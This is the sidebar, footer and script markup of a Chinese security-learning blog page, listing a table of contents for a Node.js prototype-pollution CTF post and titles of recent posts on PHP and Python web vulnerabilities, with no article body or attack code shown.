class="social-icon" href="https://github.com/tgrddf55" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/455700704" target="_blank" title="bilibili"><i class="fab fa-bilibili" style="color: #00aeff;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础"><img src="/image/52.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化基础"/></a><div class="content"><a class="title" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础">php反序列化基础</a><time datetime="2025-06-26T16:00:00.000Z" title="发表于 2025-06-27 00:00:00">2025-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议"><img src="/image/56.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><img src="/image/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti"><img src="/image/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python_ssti"/></a><div class="content"><a class="title" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti">python_ssti</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较"><img src="/image/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php弱比较"/></a><div class="content"><a class="title" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较">php弱比较</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/56.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By tgrddf55</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
